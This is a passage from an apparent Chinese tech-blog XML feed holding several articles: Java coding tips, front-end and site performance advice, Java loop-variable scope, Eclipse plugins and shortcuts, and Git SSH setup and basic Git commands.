hm.keySet();”会比较合适一些</p><p><strong>（35）对资源的close()建议分开操作</strong></p><p>意思是，比如我有这么一段代码：</p><pre class="line-numbers language-none"><code class="language-none">try&#123;    XXX.close();    YYY.close();&#125;catch (Exception e)&#123;    ...&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>建议修改为：</p><pre class="line-numbers language-none"><code class="language-none">try&#123;    XXX.close();&#125;catch (Exception e)&#123;    ...&#125;try&#123;    YYY.close();&#125;catch (Exception e)&#123;    ...&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>虽然有些麻烦，却能避免资源泄露。我们想，如果没有修改过的代码，万一XXX.close()抛异常了，那么就进入了catch块中了，YYY.close()不会执行，YYY这块资源就不会回收了，一直占用着，这样的代码一多，是可能引起资源句柄泄露的。而改为下面的写法之后，就保证了无论如何XXX和YYY都会被close掉</p><p> <strong>（36）对于ThreadLocal使用前或者使用后一定要先remove</strong></p><p>当前基本所有的项目都使用了线程池技术，这非常好，可以动态配置线程数、可以重用线程。</p><p>然而，如果你在项目中使用到了ThreadLocal，一定要记得使用前或者使用后remove一下。这是因为上面提到了线程池技术做的是一个线程重用，这意味着代码运行过程中，一条线程使用完毕，并不会被销毁而是等待下一次的使用。我们看一下Thread类中，持有ThreadLocal.ThreadLocalMap的引用：</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;* ThreadLocal values pertaining to this thread. This map is maintained * by the ThreadLocal class. *&#x2F;ThreadLocal.ThreadLocalMap threadLocals &#x3D; null;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>线程不销毁意味着上条线程set的ThreadLocal.ThreadLocalMap中的数据依然存在，那么在下一条线程重用这个Thread的时候，很可能get到的是上条线程set的数据而不是自己想要的内容。</p><p>这个问题非常隐晦，一旦出现这个原因导致的错误，没有相关经验或者没有扎实的基础非常难发现这个问题，因此在写代码的时候就要注意这一点，这将给你后续减少很多的工作量。</p><p><strong>（37）切记以常量定义的方式替代魔鬼数字，魔鬼数字的存在将极大地降低代码可读性，字符串常量是否使用常量定义可以视情况而定</strong></p><p><strong>（38）long或者Long初始赋值时，使用大写的L而不是小写的l，因为字母l极易与数字1混淆，这个点非常细节，值得注意</strong></p><p><strong>（39）所有重写的方法必须保留@Override注解</strong></p><p>这么做有三个原因：</p><p>（1）清楚地可以知道这个方法由父类继承而来</p><p>（2）getObject()和get0bject()方法，前者第四个字母是”O”，后者第四个子母是”0”，加了@Override注解可以马上判断是否重写成功</p><p>（3）在抽象类中对方法签名进行修改，实现类会马上报出编译错误</p><p><strong>（40）推荐使用JDK7中新引入的Objects工具类来进行对象的equals比较，直接a.equals(b)，有空指针异常的风险</strong></p><p> <strong>（41）循环体内不要使用”+”进行字符串拼接，而直接使用StringBuilder不断append</strong></p><p>说一下不使用”+”进行字符串拼接的原因，假如我有一个方法：</p><pre class="line-numbers language-none"><code class="language-none">public String appendStr(String oriStr, String... appendStrs) &#123;    if (appendStrs &#x3D;&#x3D; null || appendStrs.length &#x3D;&#x3D; 0) &#123;        return oriStr;    &#125;            for (String appendStr : appendStrs) &#123;        oriStr +&#x3D; appendStr;    &#125;            return oriStr;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>将这段代码编译之后的.class文件，使用javap -c进行反编译一下，截取关键的一部分：</p><p><img src="https://images2015.cnblogs.com/blog/801753/201703/801753-20170311184020826-1263016756.png" alt="image"></p><p>意思就是每次虚拟机碰到”+”这个操作符对字符串进行拼接的时候，会new出一个StringBuilder，然后调用append方法，最后调用toString()方法转换字符串赋值给oriStr对象，即循环多少次，就会new出多少个StringBuilder()来，这对于内存是一种浪费。</p><p><strong>（42）不捕获Java类库中定义的继承自RuntimeException的运行时异常类</strong></p><p>异常处理效率低，RuntimeException的运行时异常类，其中绝大多数完全可以由程序员来规避，比如：</p><ul><li>ArithmeticException可以通过判断除数是否为空来规避</li><li>NullPointerException可以通过判断对象是否为空来规避</li><li>IndexOutOfBoundsException可以通过判断数组&#x2F;字符串长度来规避</li><li>ClassCastException可以通过instanceof关键字来规避</li><li>ConcurrentModificationException可以使用迭代器来规避</li></ul><p><strong>（43）避免Random实例被多线程使用，虽然共享该实例是线程安全的，但会因竞争同一seed导致的性能下降，JDK7之后，可以使用ThreadLocalRandom来获取随机数</strong></p><p>解释一下竞争同一个seed导致性能下降的原因，比如，看一下Random类的nextInt()方法实现：</p><pre class="line-numbers language-none"><code class="language-none">public int nextInt() &#123;      return next(32);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>调用了next(int bits)方法，这是一个受保护的方法：</p><pre class="line-numbers language-none"><code class="language-none">protected int next(int bits) &#123;    long oldseed, nextseed;    AtomicLong seed &#x3D; this.seed;    do &#123;        oldseed &#x3D; seed.get();        nextseed &#x3D; (oldseed * multiplier + addend) &amp; mask;    &#125; while (!seed.compareAndSet(oldseed, nextseed));    return (int)(nextseed &gt;&gt;&gt; (48 - bits));&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>而这边的seed是一个全局变量：</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;*** The internal state associated with this pseudorandom number generator.* (The specs for the methods in this class describe the ongoing* computation of this value.)*&#x2F;private final AtomicLong seed;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>多个线程同时获取随机数的时候，会竞争同一个seed，导致了效率的降低。</p><p><strong>（44）静态类、单例类、工厂类将它们的构造函数置为private</strong></p><p>这是因为静态类、单例类、工厂类这种类本来我们就不需要外部将它们new出来，将构造函数置为private之后，保证了这些类不会产生实例对象。</p><p><strong>后记</strong></p><p>优秀的代码来自每一点点小小的优化，关注每一个细节，不仅仅能提升程序运行效率，同样可以规避许多未知的问题。</p>]]></content>
      
      
      <categories>
          
          <category> 性能 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 性能优化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>8 条关于 Web 前端性能的优化建议</title>
      <link href="/2025/10/30/%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96/8%20%E6%9D%A1%E5%85%B3%E4%BA%8E%20Web%20%E5%89%8D%E7%AB%AF%E6%80%A7%E8%83%BD%E7%9A%84%E4%BC%98%E5%8C%96%E5%BB%BA%E8%AE%AE/"/>
      <url>/2025/10/30/%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96/8%20%E6%9D%A1%E5%85%B3%E4%BA%8E%20Web%20%E5%89%8D%E7%AB%AF%E6%80%A7%E8%83%BD%E7%9A%84%E4%BC%98%E5%8C%96%E5%BB%BA%E8%AE%AE/</url>
      
        <content type="html"><![CDATA[<p>一般网站优化都是优化后台，如接口的响应时间、SQL优化、后台代码性能优化、服务器优化等。高并发情况下，对前端web优化也是非常重要的。</p><p>下面说说几种常见的优化措施。</p><p><strong>1、HTML CSS JS位置</strong></p><p>一般需要将CSS放页面最上面，即HEAD部分，而将JS代码放页面底部。因为页面需要加载为CSS才进行渲染，而JS如果不是在页面加载之前就要执行就要放到页面最底部，以免在页面展示之前因JS过多加载而影响页面渲染速度。</p><p><strong>2、引用文件位置</strong></p><p>有一些插件需要引用到远程的图片、CSS、JS、图标等，如果远程的资源连接网速不佳，如国外的某些资源，会造成网页阻塞，同样也会造成页面展示问题，尽量能把引用远程的资源能本地化。</p><p><strong>3、减少后台请求</strong></p><p>每个请求都是耗费资源影响系统性能的，所以，能减少后台请求就减少。如，尽量的将同一个资源（图片、JS、CSS等）合并成一个文件，页面只要请求一次即可，这样就节省了很多http连接的开销及往返的时间损耗。</p><p>另外一方面，如果是关于抽奖、摇一摇、秒杀等功能，可以限制发往后台的频率，如前端操作10次才往后端发一次请求，这样从前端就做到了后台的流量控制，把流量控制到访问的最外层是最好的，尽量不要让请求落到底层。</p><p><strong>4、压缩传输</strong></p><p>http压缩可以对纯文本可以压缩至原内容的40%, 从而节省了60%的数据传输，GZIP是一种常用的压缩编码。因此，对文本类型的资源如CSS、JS、HTML启用GZIP压缩加速http传输速度。</p><p><strong>5、减少cookie传输</strong></p><p>cookie会包含在每次请求和响应中，如果cookie过多会影响http响应速度，所以高并发情况下尽量控制cookie的传输量，nginx对cookie传输默认是做了限制的。另外，像CSS、JS、图片等静态资源可以启用单独域名，禁用cookie对静态资源的传输，这样就能大大提高效率。</p><p><strong>6、浏览器缓存</strong></p><p>高并发情况下，可以将一些不怎么变动的东西缓存到浏览器cache中，或者一些活动内容可以提前将内容在客户端缓存起来，以免活动开始大量请求涌入服务器。</p><p><strong>7、CDN</strong></p><p>之前的文章有讲过CDN的概念，它就是一个静态内容分发网络，本质就是静态资源的缓存，可以将静态资源放到CDN上，这样，用户就能离自己最近的地方获取到资源，大大提高了用户访问速度。</p><p><strong>8、反向代理</strong></p><p>常用的反向代理nginx除了负载均衡功能，它也可以通过配置缓存功能来加速请求响应速度，当用户第一次访问的时候静态资源就可以被缓存到反向代理服务器上，这样其他用户的请求就能直接从反向代理服务器直接获取返回，这样也就直到了静态资源缓存的作用。</p><p>我大概列了这些，其实还有很多优化手段，大家有更好的建议的话，可以在下方留言。</p>]]></content>
      
      
      <categories>
          
          <category> 性能 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 性能优化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网站性能测试指标详解</title>
      <link href="/2025/10/30/%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96/%E7%BD%91%E7%AB%99%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95%E6%8C%87%E6%A0%87%E8%AF%A6%E8%A7%A3/"/>
      <url>/2025/10/30/%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96/%E7%BD%91%E7%AB%99%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95%E6%8C%87%E6%A0%87%E8%AF%A6%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<p>常用的网站性能测试指标有：吞吐量、并发数、响应时间、性能计数器等。</p><h4 id="并发数"><a href="#并发数" class="headerlink" title="并发数"></a>并发数</h4><p>并发数是指系统同时能处理的请求数量，这个也是反应了系统的负载能力。</p><h4 id="响应时间"><a href="#响应时间" class="headerlink" title="响应时间"></a>响应时间</h4><p>响应时间是一个系统最重要的指标之一，它的数值大小直接反应了系统的快慢。响应时间是指执行一个请求从开始到最后收到响应数据所花费的总体时间。</p><h4 id="吞吐量"><a href="#吞吐量" class="headerlink" title="吞吐量"></a>吞吐量</h4><p>吞吐量是指单位时间内系统能处理的请求数量，体现系统处理请求的能力，这是目前最常用的性能测试指标。</p><p><strong>QPS</strong>（每秒查询数）、<strong>TPS</strong>（每秒事务数）是吞吐量的常用量化指标，另外还有<strong>HPS</strong>（每秒HTTP请求数）。</p><p>跟吞吐量有关的几个重要是：并发数、响应时间。</p><p>QPS（TPS），并发数、响应时间它们三者之间的关系是：</p><p><strong>QPS（TPS）&#x3D; 并发数&#x2F;平均响应时间</strong></p><h4 id="性能计数器"><a href="#性能计数器" class="headerlink" title="性能计数器"></a>性能计数器</h4><p>性能计数器是描述服务器或操作系统性能的一些数据指标，如使用内存数、进程时间，在性能测试中发挥着“监控和分析”的作用，尤其是在分析统统可扩展性、进行新能瓶颈定位时有着非常关键的作用。</p><p>Linux中可以使用top或者uptime命令看到当前系统的负载及资源利用率情况。</p><p>资源利用率：指系统各种资源的使用情况，如cpu占用率为68%，内存占用率为55%，一般使用“资源实际使用&#x2F;总的资源可用量”形成资源利用率。</p><pre class="line-numbers language-none"><code class="language-none">$ toptop - 15:47:21 up 4 days, 19:57,  7 users,  load average: 0.00, 0.00, 0.00Tasks: 109 total,   1 running, 108 sleeping,   0 stopped,   0 zombieCpu(s):  0.5%us,  0.5%sy,  0.0%ni, 98.8%id,  0.0%wa,  0.0%hi,  0.2%si,  0.0%stMem:   1922368k total,  1845156k used,    77212k free,   163552k buffersSwap:  4128760k total,    22284k used,  4106476k free,   637292k cached<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>所以，一个网站优化的目的即是，最大限度的利用好服务器硬件资源提升资源利用率，减少用户请求的响应时间，提高系统吞吐量，提高系统并发数。</p>]]></content>
      
      
      <categories>
          
          <category> 性能 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 性能优化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>百分九十Java程序员被误导的一个性能优化策略</title>
      <link href="/2025/10/30/%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96/%E7%99%BE%E5%88%86%E4%B9%9D%E5%8D%81Java%E7%A8%8B%E5%BA%8F%E5%91%98%E8%A2%AB%E8%AF%AF%E5%AF%BC%E7%9A%84%E4%B8%80%E4%B8%AA%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96%E7%AD%96%E7%95%A5/"/>
      <url>/2025/10/30/%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96/%E7%99%BE%E5%88%86%E4%B9%9D%E5%8D%81Java%E7%A8%8B%E5%BA%8F%E5%91%98%E8%A2%AB%E8%AF%AF%E5%AF%BC%E7%9A%84%E4%B8%80%E4%B8%AA%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96%E7%AD%96%E7%95%A5/</url>
      
        <content type="html"><![CDATA[<p>我们经常看到一些 Java 性能优化的书或者理念，如《<a href="https://mp.weixin.qq.com/s/HujL_5eU57STVSv8yz5KqA">44个Java代码性能优化总结</a>》。有的观念说不要在循环内定义变量，这样会占用过多的内存影响性能，而要在循环外面定义。接触 Java 这么久以来，相信很多 Java 程序员都被这种代码性能优化策略所误导。</p><p><strong>看下面两个示例，示例1在循环外定义变量，示例2是在循环内定义变量。</strong></p><pre class="line-numbers language-none"><code class="language-none">&#x2F;** * 循环外定义变量 *&#x2F;private static void outer() &#123;Javastack javastack &#x3D; null;for (int i &#x3D; 0; i &lt; 10; i++) &#123;javastack &#x3D; new Javastack();&#125;&#125;&#x2F;** * 循环内定义变量 *&#x2F;private static void inner() &#123;for (int i &#x3D; 0; i &lt; 10; i++) &#123;Javastack javastack &#x3D; new Javastack();&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>先来分析这两个示例吧。</p><h4 id="循环外定义变量"><a href="#循环外定义变量" class="headerlink" title="循环外定义变量"></a>循环外定义变量</h4><p>循环外定义变量，变量循环内每次引用指向不同的对象实例，每次循环变更对象实例时，上一次被指向的对象就会被销毁，直到最后一个循环。这样，循环结束后，这个变量还存在，并指向循环内最后一个对象实例，其他对象都销毁了。</p><p>这样，本应该是循环体内的生命周期变量被扩散到了循环外，如果循环外依旧用这个变量，会导致后面的业务发生不可预知的后果。这种问题在笔者工作当中经常会遇到，看下面的例子。</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;** * 循环外定义变量 *&#x2F;private static void outer() &#123;Javastack javastack1 &#x3D; null;for (int i &#x3D; 0; i &lt; 10; i++) &#123;javastack1 &#x3D; new Javastack();&#125;   Javastack javastack2 &#x3D; userDao.getUser(10);   &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>上面定义了一个 <code>javastack2</code> ，如果此时在后续代码或者传递到别的方法时写错了，用了 <code>javastack1</code>，那这时不就有问题了吗？这只是一方面，还有如果用同一变量名，当这一变量被重用时发生异常，本来发生异常应该是 null 值的，结果得到了是之前循环体内的值。</p><h4 id="循环内定义变量"><a href="#循环内定义变量" class="headerlink" title="循环内定义变量"></a>循环内定义变量</h4><p>循环内定义变量，和循环外略有不同的是，每次都会创建新的局部变量指向新的对象实例，每个变量和对象的生命周期仅限于在循环体之内，而且每次循环结束该局部变量和对象实例都会随着循环体的结束而销毁，所以不存在占用更多的内存这一说法。</p><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>两种用法都会创建相同数量的对象实例，只不过循环内会反复创建相同数量的局部变量，栈内存垃圾回收频率也会更高，但对于堆垃圾回收带来的性能影响和变量生命周期带来的业务影响来说，栈内存这点性能影响可以忽略不计。</p><p>所以，建议使用循环内定义变量，这种把变量的生命周期限制在循环体范围内，也不会出现业务上重用变量而导致严重的问题。</p>]]></content>
      
      
      <categories>
          
          <category> 性能 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 性能优化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>10 个 Eclipse 珍藏插件推荐</title>
      <link href="/2025/10/30/%E5%B7%A5%E5%85%B7/Eclipse/10%20%E4%B8%AA%20Eclipse%20%E7%8F%8D%E8%97%8F%E6%8F%92%E4%BB%B6%E6%8E%A8%E8%8D%90/"/>
      <url>/2025/10/30/%E5%B7%A5%E5%85%B7/Eclipse/10%20%E4%B8%AA%20Eclipse%20%E7%8F%8D%E8%97%8F%E6%8F%92%E4%BB%B6%E6%8E%A8%E8%8D%90/</url>
      
        <content type="html"><![CDATA[<h3 id="1、Open-Explorer"><a href="#1、Open-Explorer" class="headerlink" title="1、Open Explorer"></a>1、Open Explorer</h3><p>打开资源管理器插件，这是一个从Eclipse里面可以直接定位打开windows资源管理器文件的插件，这个版本的插件在最新的Eclipse版本中都能使用。</p><blockquote><p>下载地址：<a href="https://github.com/samsonw/OpenExplorer/downloads">https://github.com/samsonw/OpenExplorer/downloads</a></p></blockquote><h3 id="2、JadClipse"><a href="#2、JadClipse" class="headerlink" title="2、JadClipse"></a>2、JadClipse</h3><p>反编译插件，能反编译Jar包中的class文件。</p><blockquote><p>下载地址：<a href="https://sourceforge.net/projects/jadclipse/">https://sourceforge.net/projects/jadclipse/</a></p></blockquote><h3 id="3、Subclipse"><a href="#3、Subclipse" class="headerlink" title="3、Subclipse"></a>3、Subclipse</h3><p>Eclipse集成SVN插件，在Eclipse商店中可以直接搜索Subclipse安装。</p><h3 id="4、EGIT"><a href="#4、EGIT" class="headerlink" title="4、EGIT"></a>4、EGIT</h3><p>Eclipse集成GIT插件，在Eclipse商店中可以直接搜索GIT安装。</p><h3 id="5、Jetty"><a href="#5、Jetty" class="headerlink" title="5、Jetty"></a>5、Jetty</h3><p>Jetty容器插件，可以直接运行web项目，可以用来代替Tomcat，直接在商店安装即可。</p><h3 id="6、Spring-Tools"><a href="#6、Spring-Tools" class="headerlink" title="6、Spring Tools"></a>6、Spring Tools</h3><p>Spring的插件，可以很方便的管理和运行Spring项目，在商店可以直接安装。</p><h3 id="7、FindBugs"><a href="#7、FindBugs" class="headerlink" title="7、FindBugs"></a>7、FindBugs</h3><p>这个插件能找出Eclipse工程中的代码缺陷，很好用。</p><blockquote><p>在线安装地址：<a href="http://findbugs.cs.umd.edu/eclipse">http://findbugs.cs.umd.edu/eclipse</a></p></blockquote><h3 id="8、Maven"><a href="#8、Maven" class="headerlink" title="8、Maven"></a>8、Maven</h3><p>Maven插件，在商店可以自行安装。</p><h3 id="9、Mybatis-Generator"><a href="#9、Mybatis-Generator" class="headerlink" title="9、Mybatis Generator"></a>9、Mybatis Generator</h3><p>Mybatis生成代码及通用增删改查配置文件的插件，商店安装。</p><h3 id="10、Darkest-Dark-Theme"><a href="#10、Darkest-Dark-Theme" class="headerlink" title="10、Darkest Dark Theme"></a>10、Darkest Dark Theme</h3><p>主题插件，可以像idea那样有黑色的主题，不过看起来怪怪的，个人不是很喜欢。</p><p>另外，目前的Eclipse都会自带Maven和Git插件，可以告删除或者重新安装。</p>]]></content>
      
      
      <categories>
          
          <category> 工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Eclipse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Eclipse 最常用的 10 组快捷键</title>
      <link href="/2025/10/30/%E5%B7%A5%E5%85%B7/Eclipse/Eclipse%20%E6%9C%80%E5%B8%B8%E7%94%A8%E7%9A%84%2010%20%E7%BB%84%E5%BF%AB%E6%8D%B7%E9%94%AE/"/>
      <url>/2025/10/30/%E5%B7%A5%E5%85%B7/Eclipse/Eclipse%20%E6%9C%80%E5%B8%B8%E7%94%A8%E7%9A%84%2010%20%E7%BB%84%E5%BF%AB%E6%8D%B7%E9%94%AE/</url>
      
        <content type="html"><![CDATA[<p>虽然栈长我现在不怎么用 Eclipse 了，但 Eclipse 的快捷键还是忘不了的，可以说 Eclipse 的快捷键很方便，恰到好处。</p><p>今天，我大概整理了 10 组 Eclipse 我觉得比较常用的牛逼快捷键，希望对你有帮助。如果你是 IDEA 粉，请略过，或者期待下篇文章分解，我们再讲 IDEA 的快捷键。</p><p><strong>1、打开资源</strong></p><p>CTRL + SHIFT + R：打开所有类型文件，不包括 JAR 包；</p><p>CTRL + SHIFT + T：打开 Java 类型文件，包括 JAR 包；</p><p><strong>2、查找资源</strong></p><p>CTRL + F：查找当前编辑器内容；</p><p>CTRL + H：查找所有文件内容；</p><p>CTRL + SHIFT + G：快速查找所有引用的地方；</p><p><strong>3、代码整理</strong></p><p>CTRL + SHIFT + F：格式化代码；</p><p>CTRL + SHIFT + O：去除没有用到的引用；</p><p>CTRL + SHIFT + M：导入需要的类引用；</p><p><strong>4、重命名</strong></p><p>ALT + SHIFT + R：重命名；</p><p>CTRL + SHIFT + X：转换大写；</p><p>CTRL + SHIFT + Y：转换小写；</p><p><strong>5、切换编辑器</strong></p><p>CTRL + E：显示所有打开的编辑器列表；</p><p>CTRL + SHIFT + E：显示更详细的所有打开的编辑器列表；</p><p>ALT + 左右方向键：回到上一次&#x2F;下一次编辑所在的代码；</p><p><strong>6、快速处理行</strong></p><p>CTRL + D：删除当前行；</p><p>CTRL + SHIFT + 上下方向键：向上&#x2F;下复制当前行；</p><p>ALT + 上下方向键：向上&#x2F;下替换行；</p><p><strong>7、类继承关系</strong></p><p>CTRL + T：显示当前类继承关系列表；</p><p>F4：打开当前类继承关系对话框；</p><p>CTRL + SHIFT + H：打开指定的类继承关系对话框；</p><p><strong>8、快速修复</strong></p><p>CTRL + 1：快速修复问题；</p><p><strong>9、重构</strong></p><p>ALT + SHIFT + L：提取出局部变量；</p><p>ALT + SHIFT + M：提取出方法；</p><p>ALT + SHIFT + C：修改当前方法构造；</p><p><strong>10.添加注释</strong></p><p>CTRL + &#x2F;：用行注释注释当前行或者选择的行；</p><p>CTRL + SHIFT + C：和上面一样；</p><p>CTRL + SHIFT + &#x2F;：用块注释注释选择的行；</p><p>大概是这些了，服不服？</p><p>还有一个 CTRL + SHIFT + L 万能快捷键，不知道有什么按什么快捷键，可以按一组这个快捷键查看，要修改快捷键，就连续按两个这个组合键。</p><p>你还知道哪些比较好用的快捷键，欢迎留言分享哦。</p>]]></content>
      
      
      <categories>
          
          <category> 工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Eclipse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Git SSH 连接方式配置</title>
      <link href="/2025/10/30/%E5%B7%A5%E5%85%B7/Git/Git%20SSH%20%E8%BF%9E%E6%8E%A5%E6%96%B9%E5%BC%8F%E9%85%8D%E7%BD%AE/"/>
      <url>/2025/10/30/%E5%B7%A5%E5%85%B7/Git/Git%20SSH%20%E8%BF%9E%E6%8E%A5%E6%96%B9%E5%BC%8F%E9%85%8D%E7%BD%AE/</url>
      
        <content type="html"><![CDATA[<p>如果使用ssh的方式管理，需要配置ssh key.</p><h4 id="1、打开git-bash命令窗口"><a href="#1、打开git-bash命令窗口" class="headerlink" title="1、打开git bash命令窗口"></a>1、打开git bash命令窗口</h4><h4 id="2、生成ssh-key"><a href="#2、生成ssh-key" class="headerlink" title="2、生成ssh key"></a>2、生成ssh key</h4><pre class="line-numbers language-none"><code class="language-none">ssh-keygen -t rsa -b 4096 -C &quot;your_email@example.com&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><code>your_email@example.com</code>为github上你注册的email地址。</p><p>如下面完整创建过程：</p><pre class="line-numbers language-none"><code class="language-none">$ ssh-keygen -t rsa -b 4096 -C &quot;test@qq.com&quot;Generating public&#x2F;private rsa key pair.Enter file in which to save the key (&#x2F;c&#x2F;Users&#x2F;Administrator&#x2F;.ssh&#x2F;id_rsa):Enter passphrase (empty for no passphrase):Enter same passphrase again:Your identification has been saved in &#x2F;c&#x2F;Users&#x2F;Administrator&#x2F;.ssh&#x2F;id_rsa.Your public key has been saved in &#x2F;c&#x2F;Users&#x2F;Administrator&#x2F;.ssh&#x2F;id_rsa.pub.The key fingerprint is:SHA256:chS9dRlB6Ee+E6&#x2F;Ob9plXh5HXgDhhOk6mpST+oqrCxA test@qq.comThe key&#39;s randomart image is:+---[RSA 4096]----+|        .. o++++ ||         .+oo.+  ||E       .. +.+.  || .     .  o . +. ||.     .oS.   . +o||.     &#x3D;oo     ooo||.    o + .     +*||.  .. o      ..&#x3D;*||ooo..o.      .++&#x3D;|+----[SHA256]-----+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>上面默认生成在用户主目录的<code>.ssh</code>目录下，可以自己输入自定义位置。</p><h4 id="3、把ssh-key添加到github"><a href="#3、把ssh-key添加到github" class="headerlink" title="3、把ssh key添加到github"></a>3、把ssh key添加到github</h4><p>复制文件<code>c/Users/Administrator/.ssh/id_rsa.pub</code>内容，把key添加到：github &gt; settings &gt; SSH and GPG keys &gt; New SSH key &gt; 粘贴保存。</p><h4 id="4、测试SSH连接"><a href="#4、测试SSH连接" class="headerlink" title="4、测试SSH连接"></a>4、测试SSH连接</h4><pre class="line-numbers language-none"><code class="language-none">$ ssh -T git@github.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如下面表示已经连接成功：</p><pre class="line-numbers language-none"><code class="language-none">$ ssh -T git@github.comHi Javastack! You&#39;ve successfully authenticated, but GitHub does not provide shell access.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>现在你可以通过SSH方式来clone及提交代码了。</p><p>更多详细配置请参考官方配置：</p><pre class="line-numbers language-none"><code class="language-none">https:&#x2F;&#x2F;help.github.com&#x2F;articles&#x2F;connecting-to-github-with-ssh&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Git </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Git 仓库操作命令</title>
      <link href="/2025/10/30/%E5%B7%A5%E5%85%B7/Git/Git%20%E4%BB%93%E5%BA%93%E6%93%8D%E4%BD%9C%E5%91%BD%E4%BB%A4/"/>
      <url>/2025/10/30/%E5%B7%A5%E5%85%B7/Git/Git%20%E4%BB%93%E5%BA%93%E6%93%8D%E4%BD%9C%E5%91%BD%E4%BB%A4/</url>
      
        <content type="html"><![CDATA[<h4 id="创建仓库"><a href="#创建仓库" class="headerlink" title="创建仓库"></a>创建仓库</h4><pre class="line-numbers language-none"><code class="language-none">git init<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在当前目录执行，会生成<code>.git</code>目录文件，这个和SVN一致。</p><h4 id="提交到仓库"><a href="#提交到仓库" class="headerlink" title="提交到仓库"></a>提交到仓库</h4><pre class="line-numbers language-none"><code class="language-none">git commit -m &quot;first commit&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><code>-m</code>：表示提交描述，必须要填。</p><h4 id="添加到远端仓库"><a href="#添加到远端仓库" class="headerlink" title="添加到远端仓库"></a>添加到远端仓库</h4><pre class="line-numbers language-none"><code class="language-none">git remote add origin git@github.com:test&#x2F;test.git<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="推送到远端仓库"><a href="#推送到远端仓库" class="headerlink" title="推送到远端仓库"></a>推送到远端仓库</h4><pre class="line-numbers language-none"><code class="language-none">git push -u origin master<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="克隆仓库"><a href="#克隆仓库" class="headerlink" title="克隆仓库"></a>克隆仓库</h4><p>直接从远端把代码克隆下来。</p><pre class="line-numbers language-none"><code class="language-none">git clone git@github.com:test&#x2F;test.git<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="仓库状态"><a href="#仓库状态" class="headerlink" title="仓库状态"></a>仓库状态</h4><pre class="line-numbers language-none"><code class="language-none">git status<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">$ git statusOn branch masterInitial commitUntracked files:  (use &quot;git add &lt;file&gt;...&quot; to include in what will be committed)        README.mdnothing added to commit but untracked files present (use &quot;git add&quot; to track)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="仓库更新"><a href="#仓库更新" class="headerlink" title="仓库更新"></a>仓库更新</h4><pre class="line-numbers language-none"><code class="language-none">git pull<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>就等同下面。</p><pre class="line-numbers language-none"><code class="language-none">git fetchgit merge<span aria-hidden="true" 